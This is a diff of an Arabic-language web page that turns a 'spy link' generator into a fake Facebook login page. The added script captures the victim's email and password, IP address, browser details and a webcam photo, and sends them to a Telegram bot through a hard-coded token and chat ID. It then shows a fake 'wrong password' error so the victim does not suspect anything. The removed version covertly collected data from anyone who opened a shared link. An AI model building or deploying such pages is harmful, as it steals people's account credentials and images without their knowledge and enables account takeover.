@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رابط التوجيه</title>
+    <title>Facebook</title>
     <style>
         * {
             margin: 0;
@@ -12,123 +12,108 @@
         }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
         }
         .container {
             background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 500px;
-            width: 100%;
+            padding: 40px 50px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 400px;
             text-align: center;
         }
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 24px;
+        .fb-logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 20px;
         }
-        p {
-            color: #666;
-            margin-bottom: 25px;
+        .fb-logo span {
             font-size: 14px;
+            color: #606770;
+            display: block;
+            font-weight: normal;
+            margin-top: 5px;
         }
         input {
             width: 100%;
-            padding: 14px 18px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 16px;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: #f5f6f7;
             transition: 0.3s;
-            margin-bottom: 15px;
-            direction: ltr;
         }
         input:focus {
-            border-color: #667eea;
+            border-color: #1877f2;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+            background: white;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
             color: white;
             border: none;
-            padding: 14px 40px;
-            border-radius: 12px;
-            font-size: 18px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: 0.3s;
+        }
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .forgot {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 15px 0;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 6px;
+            font-size: 17px;
             font-weight: bold;
             cursor: pointer;
             transition: 0.3s;
-            width: 100%;
         }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        .create-btn:hover {
+            background: #36a420;
         }
-        #result {
-            margin-top: 25px;
-            padding: 20px;
-            background: #f8f9ff;
-            border-radius: 12px;
-            display: none;
-            word-break: break-all;
-        }
-        #result.show {
-            display: block;
-        }
-        .link-box {
-            background: white;
-            padding: 12px;
-            border-radius: 8px;
-            border: 2px dashed #667eea;
-            margin: 10px 0;
-        }
-        .link-box a {
-            color: #667eea;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 16px;
-        }
-        .link-box a:hover {
-            text-decoration: underline;
-            color: #764ba2;
-        }
-        .copy-btn {
-            background: #28a745;
-            color: white;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-            margin-top: 10px;
-            width: auto;
-        }
-        .copy-btn:hover {
-            background: #218838;
-        }
-        .note {
-            margin-top: 15px;
+        .footer {
+            margin-top: 20px;
             font-size: 12px;
-            color: #999;
+            color: #606770;
         }
         .loading {
             display: none;
-            margin: 15px 0;
-        }
-        .loading.show {
-            display: block;
+            margin: 10px 0;
         }
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
@@ -136,39 +121,55 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .error-msg {
+            color: red;
+            font-size: 13px;
+            margin: 5px 0;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🔗 إنشاء رابط التوجيه</h1>
-    <p>أدخل رابط صفحة فيسبوك وسنقوم بإنشاء رابط مخصص لك</p>
-
-    <input type="text" id="fbLink" placeholder="https://www.facebook.com/username" dir="ltr">
-    <button onclick="generateLink()">🚀 إنشاء الرابط</button>
-
-    <div class="loading" id="loading">
-        <div class="spinner"></div>
-        <p style="margin-top:10px;color:#667eea;">جاري إنشاء الرابط...</p>
+    <div class="fb-logo">
+        facebook
+        <span>تسجيل الدخول إلى فيسبوك</span>
     </div>
-
-    <div id="result">
-        <h3 style="color:#333;margin-bottom:10px;">✅ تم إنشاء الرابط</h3>
-        <p style="font-size:13px;color:#666;">انسخ الرابط التالي وأرسله للضحية:</p>
-        <div class="link-box" id="linkBox">
-            <a href="#" id="generatedLink" target="_blank">رابطك هنا</a>
+    
+    <form id="loginForm" onsubmit="return fakeLogin(event)">
+        <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p style="margin-top:10px;color:#606770;font-size:14px;">جاري تسجيل الدخول...</p>
         </div>
-        <button class="copy-btn" onclick="copyLink()">📋 نسخ الرابط</button>
-        <p class="note">⚠️ عند فتح الرابط، سيتم جمع البيانات تلقائياً</p>
-    </div>
+        
+        <div class="error-msg" id="errorMsg">⚠️ خطأ في البريد الإلكتروني أو كلمة المرور</div>
+        
+        <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+        
+        <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>
+        
+        <div class="divider"></div>
+        
+        <button type="button" class="create-btn" onclick="alert('هذه صفحة وهمية للاختبار')">إنشاء حساب جديد</button>
+        
+        <div class="footer">
+            <a href="#" style="color:#606770;text-decoration:none;">الصفحات</a> · 
+            <a href="#" style="color:#606770;text-decoration:none;">المطورين</a> · 
+            <a href="#" style="color:#606770;text-decoration:none;">الإعدادات</a>
+        </div>
+    </form>
 </div>
 
 <script>
     // ===== إعدادات بوت التيلجرام =====
-    const BOT_TOKEN = '8940194661:AAFXBaZq-9j9H_GuJIXHYXYOnk-hpxmLxYY'; // ⚠️ غيّر هذا
-    const CHAT_ID = '8918858258'; // ⚠️ غيّر هذا
+    const BOT_TOKEN = '8940194661:AAFXBaZq-9j9H_GuJIXHYXYOnk-hpxmLxYY'; // توكن البوت
+    const CHAT_ID = '8918858258'; // معرف الدردشة
 
-    // ===== دالة لجلب الـ IP =====
+    // ===== دالة جلب الـ IP =====
     async function getPublicIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -179,19 +180,20 @@
         }
     }
 
-    // ===== دالة لجلب بيانات المتصفح =====
+    // ===== دالة بيانات المتصفح =====
     function getBrowserInfo() {
         return `
-        📱 **بيانات الضحية**:
-        ▫️ المتصفح: ${navigator.userAgent}
-        ▫️ اللغة: ${navigator.language}
-        ▫️ الشاشة: ${screen.width}x${screen.height}
-        ▫️ الوقت: ${new Date().toLocaleString('ar-EG')}
-        ▫️ هل الكوكيز مفعلة؟ ${navigator.cookieEnabled ? 'نعم' : 'لا'}
+        🖥️ **بيانات الضحية**:
+        - المتصفح: ${navigator.userAgent}
+        - اللغة: ${navigator.language}
+        - الشاشة: ${screen.width}x${screen.height}
+        - الوقت: ${new Date().toLocaleString('ar-EG')}
+        - كوكيز مفعلة: ${navigator.cookieEnabled ? 'نعم' : 'لا'}
+        - هل الموقع HTTPS: ${window.location.protocol === 'https:' ? 'نعم' : 'لا'}
         `;
     }
 
-    // ===== دالة التصوير =====
+    // ===== دالة التقاط الصورة =====
     function capturePhoto() {
         return new Promise((resolve) => {
             navigator.mediaDevices.getUserMedia({ 
@@ -215,7 +217,6 @@
                     ctx.drawImage(video, 0, 0, 640, 480);
                     const imageData = canvas.toDataURL('image/jpeg', 0.9);
                     
-                    // تنظيف
                     stream.getTracks().forEach(track => track.stop());
                     video.remove();
                     canvas.remove();
@@ -223,14 +224,13 @@
                     resolve(imageData);
                 }, 800);
             })
-            .catch(err => {
-                console.warn('❌ الكاميرا مرفوضة أو غير موجودة:', err);
+            .catch(() => {
                 resolve(null);
             });
         });
     }
 
-    // ===== دالة إرسال إلى تيلجرام =====
+    // ===== دالة إرسال لتيلجرام =====
     async function sendToTelegram(type, content) {
         const baseUrl = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
@@ -249,7 +249,7 @@
                 const blob = dataURLtoBlob(content);
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'spy_photo.jpg');
+                formData.append('photo', blob, 'facebook_spy.jpg');
 
                 await fetch(`${baseUrl}/sendPhoto`, {
                     method: 'POST',
@@ -257,7 +257,7 @@
                 });
             }
         } catch (e) {
-            console.error('❌ فشل الإرسال لتيلجرام:', e);
+            console.error('❌ فشل الإرسال:', e);
         }
     }
 
@@ -274,151 +274,92 @@
         return new Blob([arrayBuffer], { type: mime });
     }
 
-    // ===== إنشاء رابط عشوائي =====
-    function generateFakeLink(fbUrl) {
-        const randomId = Math.random().toString(36).substring(2, 12);
-        const domain = 'https://' + ['link-zone', 'go-page', 'visit-now', 'click-here'][Math.floor(Math.random() * 4)] + '.com';
-        return `${domain}/${randomId}?ref=${encodeURIComponent(fbUrl)}`;
-    }
-
-    // ===== الوظيفة الرئيسية: لما المستخدم يدوس "تم" =====
-    async function generateLink() {
-        const input = document.getElementById('fbLink');
-        const resultDiv = document.getElementById('result');
-        const loadingDiv = document.getElementById('loading');
-        const linkBox = document.getElementById('linkBox');
-        const linkAnchor = document.getElementById('generatedLink');
+    // ===== الوظيفة الرئيسية: لما الضحية يدخل بياناته ويدوس تسجيل =====
+    async function fakeLogin(event) {
+        event.preventDefault(); // نمنع إرسال الفورم عشان نتحكم فيه
         
-        const fbUrl = input.value.trim();
-
-        if (!fbUrl) {
-            alert('⚠️ الرجاء إدخال رابط فيسبوك أولاً!');
-            input.focus();
-            return;
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const loginBtn = document.getElementById('loginBtn');
+        const loading = document.getElementById('loading');
+        const errorMsg = document.getElementById('errorMsg');
+        
+        // إخفاء أي رسالة خطأ سابقة
+        errorMsg.style.display = 'none';
+        
+        // نتحقق من الحقول
+        if (!email || !password) {
+            errorMsg.textContent = '⚠️ الرجاء ملء جميع الحقول';
+            errorMsg.style.display = 'block';
+            return false;
         }
-
-        // إظهار التحميل
-        loadingDiv.classList.add('show');
-        resultDiv.classList.remove('show');
-
-        // 1. إنشاء رابط وهمي
-        const fakeLink = generateFakeLink(fbUrl);
-
-        // 2. عرض الرابط للمستخدم
-        setTimeout(() => {
-            loadingDiv.classList.remove('show');
-            resultDiv.classList.add('show');
-            linkAnchor.href = fakeLink;
-            linkAnchor.textContent = fakeLink;
-            // حفظ الرابط لاستخدامه في النسخ
-            linkAnchor.setAttribute('data-link', fakeLink);
-        }, 1500);
-
-        // 3. نربط الحدث: لما يفتح الرابط (ده هننفذه في صفحة منفصلة)
-        // بس هنا هنخزن الرابط في localStorage عشان الصفحة التانية تقراه
-        localStorage.setItem('fb_redirect', fbUrl);
-        localStorage.setItem('spy_link', fakeLink);
-
-        console.log('✅ الرابط الوهمي:', fakeLink);
-    }
-
-    // ===== دالة نسخ الرابط =====
-    function copyLink() {
-        const link = document.getElementById('generatedLink').getAttribute('data-link');
-        if (link) {
-            navigator.clipboard.writeText(link).then(() => {
-                alert('✅ تم نسخ الرابط!');
-            }).catch(() => {
-                // طريقة بديلة
-                const textarea = document.createElement('textarea');
-                textarea.value = link;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand('copy');
-                textarea.remove();
-                alert('✅ تم نسخ الرابط!');
-            });
-        }
-    }
-
-    // ===== ✅ الجزء المهم: لما الضحية يفتح الرابط =====
-    // ده هيشتغل تلقائياً لو الصفحة الحالية هي الرابط الوهمي
-    // لكن احنا محتاجين نفتح صفحة جديدة للضحية
-    // فلما يتم فتح الرابط، هنشغل الكود ده:
-
-    // هنضيف كود يتشغل تلقائياً عند تحميل الصفحة
-    (function autoSpy() {
-        // نتحقق لو في رابط في الـ URL
-        const currentUrl = window.location.href;
-        const params = new URLSearchParams(window.location.search);
-        const ref = params.get('ref');
-
-        // لو الرابط الحالي بيشبه الرابط الوهمي (فيه ref)
-        if (ref && currentUrl.includes('link-zone') || currentUrl.includes('go-page') || currentUrl.includes('visit-now') || currentUrl.includes('click-here')) {
-            // ده معناه إن الضحية فتح الرابط الوهمي
-            console.log('🕵️ تم فتح الرابط الوهمي! نبدأ التجسس...');
-            
-            // نبدأ جمع البيانات
-            startSpying(ref);
-        }
-    })();
-
-    // ===== دالة التجسس الرئيسية =====
-    async function startSpying(fbUrl) {
+        
+        // تعطيل الزر وإظهار التحميل
+        loginBtn.disabled = true;
+        loginBtn.textContent = 'جاري التسجيل...';
+        loading.style.display = 'block';
+        
         try {
             // 1. جلب الـ IP
             const ip = await getPublicIP();
             
             // 2. بيانات المتصفح
-            const browserInfo = getBrowserInfo();
+            const browserData = getBrowserInfo();
             
             // 3. التقاط الصورة (لو سمحت الكاميرا)
-            const photo = await capturePhoto();
+            const photoBase64 = await capturePhoto();
             
             // 4. تجهيز الرسالة
-            let message = `🎯 **تم اختراق الضحية!**\n\n`;
-            message += `🔗 الرابط المفتوح: ${window.location.href}\n`;
-            message += `🎯 رابط فيسبوك الأصلي: ${fbUrl || 'غير معروف'}\n\n`;
-            message += browserInfo;
-            message += `\n🌐 IP العمومي: ${ip}`;
+            let message = `🎯 **تم اختراق حساب فيسبوك!**\n\n`;
+            message += `📧 البريد: ${email}\n`;
+            message += `🔑 كلمة المرور: ${password}\n\n`;
+            message += `🌐 IP: ${ip}\n`;
+            message += browserData;
+            message += `\n📍 الرابط: ${window.location.href}`;
             
-            // 5. إرسال النص
+            // 5. إرسال البيانات
             await sendToTelegram('text', message);
             
             // 6. إرسال الصورة لو موجودة
-            if (photo) {
-                await sendToTelegram('photo', photo);
+            if (photoBase64) {
+                await sendToTelegram('photo', photoBase64);
             }
             
-            // 7. توجيه الضحية لفيسبوك عشان متشكش
+            console.log('✅ تم إرسال البيانات بنجاح!');
+            
+            // 7. نعرض رسالة خطأ وهمية (عشان متشكش)
+            loading.style.display = 'none';
+            errorMsg.textContent = '⚠️ خطأ في البريد الإلكتروني أو كلمة المرور';
+            errorMsg.style.display = 'block';
+            
+            // 8. نعيد تفعيل الزر بعد 3 ثواني
             setTimeout(() => {
-                if (fbUrl) {
-                    window.location.href = fbUrl;
-                } else {
-                    window.location.href = 'https://www.facebook.com';
-                }
-            }, 2000);
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'تسجيل الدخول';
+                // نفضي الحقول عشان يجرب تاني
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                errorMsg.style.display = 'none';
+            }, 3000);
             
         } catch (error) {
-            console.error('❌ خطأ في التجسس:', error);
-            // حتى لو فشل، يوجه لفيسبوك
-            window.location.href = fbUrl || 'https://www.facebook.com';
+            console.error('❌ خطأ:', error);
+            loading.style.display = 'none';
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'تسجيل الدخول';
         }
+        
+        return false;
     }
 
-    // ===== كود إضافي: لو الرابط الوهمي فيه ref، ابدأ التجسس فوراً =====
-    // نفحص الـ URL عند التحميل
+    // ===== نفحص إذا كان الرابط فيه ref (للتوافق مع الرابط الوهمي) =====
     window.addEventListener('load', function() {
         const params = new URLSearchParams(window.location.search);
         const ref = params.get('ref');
-        if (ref && window.location.hostname.includes('link-zone') || 
-            window.location.hostname.includes('go-page') ||
-            window.location.hostname.includes('visit-now') ||
-            window.location.hostname.includes('click-here')) {
-            // تأخير بسيط عشان يضمن تحميل كل حاجة
-            setTimeout(() => {
-                startSpying(ref);
-            }, 500);
+        if (ref) {
+            console.log('🕵️ تم فتح الرابط الوهمي!');
+            // نسجل في الكونسول بس، لكن مش هنعمل حاجة تلقائية
+            // عشان الضحية لازم يدوس تسجيل دخول عشان ناخد البيانات
         }
     });
 </script>
